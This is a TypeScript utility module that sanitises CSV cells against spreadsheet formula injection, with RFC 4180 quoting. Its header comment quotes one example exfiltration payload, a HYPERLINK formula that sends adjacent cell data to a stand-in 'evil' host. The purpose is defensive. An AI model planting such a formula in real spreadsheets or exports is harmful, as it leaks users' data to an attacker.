/**
 * CSV sanitisation utilities (Phase 3b).
 *
 * Implements ARCHITECTURE §4 "Formula injection 防御":
 *
 *   > 各セルが `=`/`+`/`-`/`@`/`\t`/`\r` 始まりなら先頭 `'` prepend、
 *   > unit test 必須。
 *
 * Excel / Google Sheets treat a cell that begins with `=`, `+`, `-`, `@`,
 * `\t`, or `\r` as a formula or as command input. A malicious supplier
 * inserting `=HYPERLINK("http://evil/?leak=" & A2, "click")` into a code
 * field can exfiltrate adjacent cell values the moment a tenant_admin
 * opens the export. Prepending an apostrophe forces the spreadsheet to
 * treat the cell as literal text — the apostrophe itself is stripped on
 * display but breaks the formula evaluation path.
 *
 * Quoting follows RFC 4180:
 *   * cells that contain `,`, `"`, `\r`, or `\n` are wrapped in `"..."`
 *   * any `"` inside the cell becomes `""`
 *
 * Pure functions — safe to import from client OR server code (the actual
 * CSV stream goes through the Edge Function but the same helpers also
 * back the in-browser preview flow shipped with the import screen).
 */

/**
 * Characters that, when they appear as the first character of a CSV
 * cell, are interpreted by Excel / Sheets / LibreOffice as the start
 * of a formula or as command input. Prepending an apostrophe forces
 * literal-text interpretation.
 */
const FORMULA_PREFIXES = new Set(["=", "+", "-", "@", "\t", "\r"]);

/** Characters that force the cell to be quoted per RFC 4180. */
const QUOTE_TRIGGER = /[",\r\n]/;

/**
 * Sanitise a single CSV cell value. Coerces null / undefined to an empty
 * string, prepends `'` to anything starting with a formula trigger, then
 * applies RFC 4180 quoting. Numbers are stringified via String().
 *
 * @see ARCHITECTURE.md §4 (formula injection 防御)
 */
export function sanitizeCsvCell(
  value: string | number | null | undefined,
): string {
  if (value === null || value === undefined) return "";

  // Number coercion happens before the formula check so a numeric `42`
  // never gets a stray apostrophe prepended (its string form starts
  // with a digit). Negative numbers DO get the apostrophe because the
  // leading `-` is indistinguishable to Excel from a formula start.
  let text = typeof value === "number" ? String(value) : value;

  if (text.length > 0 && FORMULA_PREFIXES.has(text[0]!)) {
    text = `'${text}`;
  }

  if (QUOTE_TRIGGER.test(text)) {
    return `"${text.replace(/"/g, '""')}"`;
  }
  return text;
}

/**
 * Serialise one row of cells using `,` as the separator and the
 * sanitiser above for each cell.
 */
export function serializeCsvRow(
  cells: ReadonlyArray<string | number | null | undefined>,
): string {
  return cells.map(sanitizeCsvCell).join(",");
}

/**
 * Serialise an entire CSV body. Rows are joined with `\r\n` per
 * RFC 4180. No trailing newline is appended — callers that need one
 * can concatenate `"\r\n"` themselves (the CSV export EF does so via
 * its streaming writer).
 *
 * @see ARCHITECTURE.md §4 (CSV 出力)
 */
export function serializeCsv(
  rows: ReadonlyArray<ReadonlyArray<string | number | null | undefined>>,
): string {
  return rows.map(serializeCsvRow).join("\r\n");
}
